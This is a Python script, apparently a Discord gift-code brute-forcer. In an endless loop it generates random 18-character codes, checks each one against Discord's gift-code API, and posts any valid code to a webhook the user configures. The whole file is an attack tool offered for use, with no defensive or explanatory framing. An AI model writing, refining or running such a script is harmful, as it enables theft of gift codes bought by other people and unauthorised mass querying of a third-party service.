import string
import random
import requests
import json

WEBHOOK_URL = "L'url de votre webhook"

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def send_request(code):
    url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
    response = requests.get(url)
    if response.status_code == 200:
        send_to_discord(code)

def send_to_discord(code):
    payload = {
        "content": f"New gift code generated: {code}"
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers)
    if response.status_code != 200:
        print("Failed to send message to Discord webhook")

def main():
    while True:
        code = generate_random_string(18)
        send_request(code)

if __name__ == "__main__":
    main()
